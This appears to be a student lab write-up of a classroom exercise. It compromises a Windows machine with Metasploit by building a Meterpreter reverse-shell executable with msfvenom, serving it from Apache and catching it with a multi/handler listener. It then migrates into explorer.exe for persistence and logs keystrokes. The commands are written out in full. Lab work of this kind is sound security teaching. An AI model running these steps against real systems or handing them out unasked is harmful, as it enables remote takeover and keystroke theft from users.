# Compromising-windows-using-Metasploit
Compromising windows using Metasploit

# Metasploit
Compromising windows using Metasploit

# AIM:
To Compromise windows using Metasploit .

## DESIGN STEPS:
### Step 1:
Install kali linux either in partition or virtual box or in live mode

### Step 2:
Investigate on the various categories of tools as follows:

### Step 3:
Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/241e38d4-48ea-4e84-844c-203800b748ab)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/9a5df072-ea93-4d78-b19d-0b538abd2afe)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/fa436c58-1533-42ad-953e-05aab7679b33)

Start apache server sudo systemctl apache2 start
## OUTPUT:
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/79b3ed4f-2e95-4c10-9308-3c931e3f9b07)

Check the status of apache2
## OUTPUT:
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/fcc713e4-2884-489f-9682-8b418e6071df)

Invoke msfconsole:
## OUTPUT:
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/afb1606a-460c-4142-840f-2c5eca6de9df)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/5485dcda-63dc-46fc-9e17-982b7fb666c1)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/e65719b5-a0a3-4791-8179-01f60ef680d4)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/9e462cee-0922-46b0-bbdc-5eec4b3493fb)

Bypass any warning boxes, double-click the file, and allow it to run.
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/465816f7-7f2d-4cd1-9ec1-a37730d2ac72)

On kali give the command exploit
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/9c28793a-9789-45b3-93b9-73328162f9a3)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/3ebff0be-9705-4b37-8d25-ee198512f4c2)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/d4a87497-8634-494d-a4e8-f8d892cc7080)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/679e1a38-ac9a-4827-bceb-11eca119d56a)
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/f30636e6-c1b1-4f9f-ab43-ff1c400bafa5)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/847f50fc-ae46-4a16-babf-63782184e0b4)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
